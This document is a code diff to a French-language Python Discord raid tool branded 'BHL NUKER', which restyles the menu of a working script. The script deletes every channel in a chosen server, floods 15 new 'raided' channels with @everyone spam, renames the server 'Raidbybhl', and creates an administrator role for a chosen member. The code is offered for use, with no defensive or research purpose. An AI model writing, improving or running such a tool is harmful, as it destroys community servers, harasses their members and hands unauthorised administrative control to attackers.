@@ -7,42 +7,49 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 
 # Initialisation des intents
-intents = discord.Intents.all()
+intents = discord.Intents.default()
+intents.members = True  # Permet d'accéder aux informations des membres
+intents.messages = True  # Permet d'écouter les messages
+
+# Initialisation du client avec intents
 client = discord.Client(intents=intents)
 
 guilds_list = []  # Stocke les serveurs où le bot est présent
 
-# Utiliser une chaîne brute pour éviter les erreurs de séquence d'échappement
+# Nouveau design ASCII art pour bhlnuker
 ascii_art = r'''
- _     _     _     _   _ _   _ _  __    ____  
-| |__ | |__ | |   | \ | | | | | |/ /___|  _ \ 
-| '_ \| '_ \| |   |  \| | | | | ' // _ \ |_) |
-| |_) | | | | |___| |\  | |_| | . \  __/  _ < 
-|_.__/|_| |_|_____|_| \_|\___/|_|\_\___|_| \_\ 
+██████╗ ██╗  ██╗██╗      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
+██╔══██╗██║  ██║██║      ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
+██████╔╝███████║██║█████╗██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██╔══██╗██╔══██║██║╚════╝██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+██████╔╝██║  ██║██║      ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
+╚═════╝ ╚═╝  ╚═╝╚═╝      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 '''
-
 
 def afficher_interface():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.RED + ascii_art)
-    print(Fore.RED + """
-Commandes disponibles :
-1. Voir les serveurs où le bot est présent
-2. Changer le nom d'un serveur
-3. Troll
-4. Supp
-5. Créer un rôle administrateur pour un membre
-""" + Style.RESET_ALL)
+    print(Fore.GREEN + ascii_art)
+    print(Fore.RED + "═" * 60)
+    print(Fore.CYAN + "║" + Fore.YELLOW + "           BHL NUKER PANEL - POWERED BY BHL          " + Fore.CYAN + "║")
+    print(Fore.RED + "═" * 60)
+    print(Fore.CYAN + "║ " + Fore.WHITE + "1. Liste des serveurs" + " " * 36 + Fore.CYAN + "║")
+    print(Fore.CYAN + "║ " + Fore.WHITE + "2. Renommer le serveur" + " " * 34 + Fore.CYAN + "║")
+    print(Fore.CYAN + "║ " + Fore.WHITE + "3. Mode Troll (spam de salons)" + " " * 23 + Fore.CYAN + "║")
+    print(Fore.CYAN + "║ " + Fore.WHITE + "4. NUKE COMPLET (suppression totale)" + " " * 16 + Fore.CYAN + "║")
+    print(Fore.CYAN + "║ " + Fore.WHITE + "5. Donner les droits admin à un membre" + " " * 14 + Fore.CYAN + "║")
+    print(Fore.RED + "═" * 60)
+    print(Fore.LIGHTBLACK_EX + "║ " + "Developed by BHL | V3.0 | discord.gg/" + " " * 15 + Fore.CYAN + "║")
+    print(Fore.RED + "═" * 60 + Style.RESET_ALL)
 
 async def start_bot(token):
     @client.event
     async def on_ready():
         global guilds_list
         guilds_list = [(guild.name, guild.id) for guild in client.guilds]
-        print(Fore.RED + f"Bot connecté en tant que {client.user}")
-        print(Fore.RED + "Serveurs détectés :")
+        print(Fore.GREEN + f"[+] Bot connecté en tant que {client.user}")
+        print(Fore.GREEN + "[+] Serveurs détectés :")
         for name, gid in guilds_list:
-            print(Fore.RED + f"- {name} (ID: {gid})")
+            print(Fore.GREEN + f"    - {name} (ID: {gid})")
 
         # Une fois le bot prêt, afficher le menu
         await cmd_interface()  # Appel asynchrone de cmd_interface
@@ -52,8 +59,9 @@ async def start_bot(token):
 def demander_token():
     # Affiche l'ASCII art avant de demander le token
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.RED + ascii_art)
-    token = input(Fore.RED + "Entrez le token de votre bot : ")
+    print(Fore.GREEN + ascii_art)
+    print(Fore.RED + "═" * 60)
+    token = input(Fore.CYAN + "[?] Entrez le token du bot : ")
     # Lancer le bot de manière asynchrone
     asyncio.run(start_bot(token))
 
@@ -61,96 +69,91 @@ async def cmd_interface():
     while True:
         afficher_interface()
         try:
-            choix = input(Fore.RED + "\nEntrez le numéro de la commande : ")
+            choix = input(Fore.CYAN + "\n[>] Sélectionnez une option : " + Fore.WHITE)
 
             if choix == '1':
                 os.system('cls' if os.name == 'nt' else 'clear')
-                print(Fore.RED + "Serveurs où le bot est présent :")
+                print(Fore.GREEN + "[+] Serveurs disponibles :")
                 if guilds_list:
                     for name, gid in guilds_list:
-                        print(Fore.RED + f"- {name} (ID: {gid})")
-                    sous_choix = input(Fore.RED + "\nTapez 1 pour générer un lien d'invitation ou 2 pour revenir au menu : ")
+                        print(Fore.GREEN + f"    - {name} (ID: {gid})")
+                    sous_choix = input(Fore.CYAN + "\n[?] 1. Générer un lien d'invitation | 2. Retour : " + Fore.WHITE)
                     if sous_choix == '1':
-                        serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
+                        serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
 
                         async def generer_invite():
                             guild = discord.utils.get(client.guilds, id=serveur_id)
                             if guild and guild.text_channels:
                                 invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
-                                print(Fore.RED + f"Lien d'invitation : {invite.url}")
+                                print(Fore.GREEN + f"[+] Lien d'invitation : {invite.url}")
                             else:
-                                print(Fore.RED + "Serveur ou salon non trouvé.")
+                                print(Fore.RED + "[!] Serveur ou salon non trouvé.")
 
                         await generer_invite()
-                        input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                        input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
                 else:
-                    print(Fore.RED + "Aucun serveur détecté. Assurez-vous que le bot est connecté.")
-                    input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                    print(Fore.RED + "[!] Aucun serveur détecté")
+                    input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
             elif choix == '2':
-                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
-                nouveau_nom = input(Fore.RED + "Entrez le nouveau nom du serveur : ")
+                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
+                nouveau_nom = input(Fore.CYAN + "[?] Nouveau nom : " + Fore.WHITE)
 
                 async def changer_nom():
                     guild = discord.utils.get(client.guilds, id=serveur_id)
                     if guild:
                         await guild.edit(name=nouveau_nom)
-                        print(Fore.RED + f"Nom du serveur changé en : {nouveau_nom}")
+                        print(Fore.GREEN + f"[+] Serveur renommé : {nouveau_nom}")
                     else:
-                        print(Fore.RED + "Serveur non trouvé.")
+                        print(Fore.RED + "[!] Serveur non trouvé")
 
                 await changer_nom()
-                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
             elif choix == '3':
-                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
+                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
 
                 async def funny():
                     guild = discord.utils.get(client.guilds, id=serveur_id)
                     if guild:
-                        tasks = []  # Liste des tâches pour exécuter en parallèle
+                        tasks = []
 
                         # Suppression des salons existants
                         for channel in guild.channels:
-                            # Vérification si le salon est requis pour un serveur communautaire
                             if isinstance(channel, discord.TextChannel) and channel.name == "community" and channel.category is not None:
-                                print(Fore.RED + f"Le salon '{channel.name}' est requis pour le serveur communautaire et ne sera pas supprimé.")
-                                continue  # Ignore ce salon et passe au suivant
+                                print(Fore.YELLOW + "[!] Salon 'community' protégé, ignoré")
+                                continue
                             try:
-                                tasks.append(channel.delete())  # Ajout de la tâche de suppression
-                                print(Fore.RED + f"Salon {channel.name} supprimé.")
+                                tasks.append(channel.delete())
+                                print(Fore.GREEN + f"[+] Salon {channel.name} supprimé")
                             except discord.errors.Forbidden:
-                                print(Fore.RED + f"Impossible de supprimer le salon {channel.name}, permission insuffisante.")
+                                print(Fore.RED + f"[!] Permission refusée pour {channel.name}")
                             except discord.errors.HTTPException as e:
-                                print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")
+                                print(Fore.RED + f"[!] Erreur: {e}")
 
-                        # Attente de la fin de toutes les suppressions
                         await asyncio.gather(*tasks)
-
-                        tasks.clear()  # Vider la liste des tâches avant de recréer les salons
+                        tasks.clear()
 
                         # Création de 15 salons
                         for i in range(15):
                             salon = await guild.create_text_channel("raided")
-                            print(Fore.RED + f"Salon '{salon.name}' créé.")
+                            print(Fore.GREEN + f"[+] Salon {salon.name} créé")
 
-                            # Envoie du message avec le lien du GIF 5 fois dans le salon
                             for _ in range(30):
                                 tasks.append(salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif"))
-                                print(Fore.RED + f"@everyone mentionné dans '{salon.name}'.")
+                                print(Fore.GREEN + f"[+] Spam envoyé dans {salon.name}")
 
-                        # Attente de l'envoi de tous les messages
                         await asyncio.gather(*tasks)
 
                     else:
-                        print(Fore.RED + "Serveur non trouvé.")
+                        print(Fore.RED + "[!] Serveur non trouvé")
 
                 await funny()
-                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
             elif choix == '4':
-                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur pour supprimer tous les salons : "))
+                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur à NUKE : " + Fore.WHITE))
 
                 async def supprimer_tous_les_salons_et_creer_nuked():
                     guild = discord.utils.get(client.guilds, id=serveur_id)
@@ -158,61 +161,56 @@ async def cmd_interface():
                         for channel in guild.channels:
                             try:
                                 await channel.delete()
-                                print(Fore.RED + f"Salon {channel.name} supprimé.")
+                                print(Fore.GREEN + f"[+] Salon {channel.name} supprimé")
                             except discord.errors.Forbidden:
-                                print(Fore.RED + f"Impossible de supprimer le salon {channel.name}, permission insuffisante.")
+                                print(Fore.RED + f"[!] Permission refusée pour {channel.name}")
                             except discord.errors.HTTPException as e:
-                                print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")
+                                print(Fore.RED + f"[!] Erreur: {e}")
 
-                        print(Fore.RED + "Tous les salons ont été supprimés.")
+                        print(Fore.GREEN + "[+] NUKE terminé")
 
-                        # Changer le nom du serveur en "NUKE"
                         await guild.edit(name="Raidbybhl")
-                        print(Fore.RED + "Nom du serveur changé en : Raidbybhl")
+                        print(Fore.GREEN + "[+] Serveur renommé en Raidbybhl")
 
-                        # Création du salon 'nuked'
                         nuked_channel = await guild.create_text_channel("Raidbybhl")
-                        print(Fore.RED + f"Salon 'Raidbybhl' créé.")
-                        # Envoi du message avec le lien du GIF
+                        print(Fore.GREEN + "[+] Salon Raidbybhl créé")
                         await nuked_channel.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif")
-                        print(Fore.RED + f"Message avec le lien du GIF envoyé dans le salon 'nuked'.")
+                        print(Fore.GREEN + "[+] Message envoyé")
                     else:
-                        print(Fore.RED + "Serveur non trouvé.")
+                        print(Fore.RED + "[!] Serveur non trouvé")
 
                 await supprimer_tous_les_salons_et_creer_nuked()
-                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
             elif choix == '5':
-                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
-                membre_id = int(input(Fore.RED + "Entrez l'ID du membre : "))
+                serveur_id = int(input(Fore.CYAN + "[?] ID du serveur : " + Fore.WHITE))
+                membre_id = int(input(Fore.CYAN + "[?] ID du membre : " + Fore.WHITE))
 
                 async def creer_et_attribuer_role():
                     guild = discord.utils.get(client.guilds, id=serveur_id)
                     if guild:
-                        # Créer le rôle avec des permissions administrateur
                         permissions = discord.Permissions(administrator=True)
                         role = await guild.create_role(name="BHL", permissions=permissions)
-                        print(Fore.RED + "Rôle 'BHL' créé avec des permissions administrateur.")
+                        print(Fore.GREEN + "[+] Rôle BHL créé")
 
-                        # Attribuer le rôle au membre
                         membre = discord.utils.get(guild.members, id=membre_id)
                         if membre:
                             await membre.add_roles(role)
-                            print(Fore.RED + f"Le rôle 'BHL' a été attribué à {membre.name}.")
+                            print(Fore.GREEN + f"[+] Admin donné à {membre.name}")
                         else:
-                            print(Fore.RED + "Membre non trouvé.")
+                            print(Fore.RED + "[!] Membre non trouvé")
                     else:
-                        print(Fore.RED + "Serveur non trouvé.")
+                        print(Fore.RED + "[!] Serveur non trouvé")
 
-                await creer_et_attribuer_role()  # Utilisation de 'await' ici
-                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                await creer_et_attribuer_role()
+                input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour continuer..." + Fore.WHITE)
 
             else:
-                print(Fore.RED + "Commande invalide. Veuillez réessayer.")
-                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
-        except Exception as e:
-            print(Fore.RED + f"Erreur : {e}")
-            input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
+                print(Fore.RED + "[!] Option non valide")
 
-if __name__ == "__main__":
-    demander_token()
+        except ValueError:
+            print(Fore.RED + "[!] Entrée invalide")
+            input(Fore.CYAN + "\n[>] Appuyez sur Entrée pour réessayer..." + Fore.WHITE)
+
+# Démarrer le script en demandant le token
+demander_token()
